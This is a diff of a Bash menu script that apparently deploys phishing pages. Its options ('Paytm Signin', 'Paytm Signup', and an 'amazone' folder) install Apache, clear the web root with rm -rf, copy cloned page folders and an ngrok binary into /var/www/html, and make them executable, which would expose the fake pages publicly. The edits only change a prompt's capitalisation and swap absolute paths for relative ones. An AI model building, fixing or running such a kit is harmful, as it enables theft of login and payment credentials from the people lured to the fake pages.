@@ -37,7 +37,7 @@ read Choice
 case $Choice in
 	1) echo -e $white "(1) Paytm Signin"
 	   echo -e $white "(2) Paytm Signup"
-		 echo -e $yellow "enter your option"
+		 echo -e $yellow "Enter your option"
 		 read option
 		 case $option in 
 			 1) apt-get install apache2
@@ -46,8 +46,8 @@ case $Choice in
 		systemctl restart apache2.service
 		mv /var/www/html/* /var/www/
 		rm -rf /var/www/html/*
-		cp -R /root/Desktop/Model/ngrok /var/www/html/
-		cd /root/Desktop/Model/paytm/
+		cp -R ngrok /var/www/html/
+		cd paytm/
 		cp -R * /var/www/html/
 		cd /var/www/html/
 		chmod +x *
@@ -66,8 +66,8 @@ case $Choice in
 		systemctl restart apache2.service
 		mv /var/www/html/* /var/www/
 		rm -rf /var/www/html/*
-		cp -R /root/Desktop/Model/ngrok /var/www/html/
-		cd /root/Desktop/Model/signup/
+		cp -R ngrok /var/www/html/
+		cd signup/
 		cp -R * /var/www/html/
 		cd /var/www/html/
 		chmod +x *
@@ -87,8 +87,8 @@ case $Choice in
 		systemctl restart apache2.service
 		mv /var/www/html/* /var/www/
 		rm -rf /var/www/html/*
-		cp -R /root/Desktop/Model/ngrok /var/www/html/
-		cd /root/Desktop/Model/amazone/
+		cp -R ngrok /var/www/html/
+		cd amazone/
 		cp -R * /var/www/html/
 		cd /var/www/html/
 		chmod +x *
